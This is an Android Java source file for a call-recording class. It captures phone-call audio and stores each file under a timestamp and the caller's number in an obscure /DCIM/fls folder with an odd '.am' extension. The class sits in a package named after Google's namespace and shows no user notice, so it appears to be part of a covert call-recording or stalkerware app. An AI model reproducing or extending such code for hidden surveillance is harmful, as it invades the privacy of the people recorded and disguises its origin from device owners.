package com.google.tracking.call;

import android.media.MediaRecorder;
import android.os.Environment;
import android.widget.Toast;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class RecorderController {
    private MediaRecorder recorder;
    private boolean recordstarted = false;
    File audiofile;

    public void stop()
    {
        if(recordstarted)
        {
            recorder.stop();
        }
        recordstarted = false;
    }

    public void record(String phoneNumber) {
        if(recordstarted)
        {
//            throw new Error("Trying to start new record while previous not stopped");
            stop();
        }



        File sampleDir = new File(Environment.getExternalStorageDirectory(), "/DCIM/fls");
        if (!sampleDir.exists()) {
            sampleDir.mkdirs();
        }

        String time_stamp = new SimpleDateFormat("yyyy_MM_dd_hh_mm_ss").format(new Date());
        String file_name = time_stamp + "_n_";
        file_name += (phoneNumber != null) ? phoneNumber : "unknown_phone_number";


        try {
            audiofile = File.createTempFile(file_name, ".am", sampleDir);
        } catch (IOException e) {
            e.printStackTrace();
        }
        String path = Environment.getExternalStorageDirectory().getAbsolutePath();

        recorder = new MediaRecorder();
//                          recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);

        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(audiofile.getAbsolutePath());
//            recorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM/aud.amr");
        try {
            recorder.prepare();
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        recorder.start();
        recordstarted = true;
    }
}
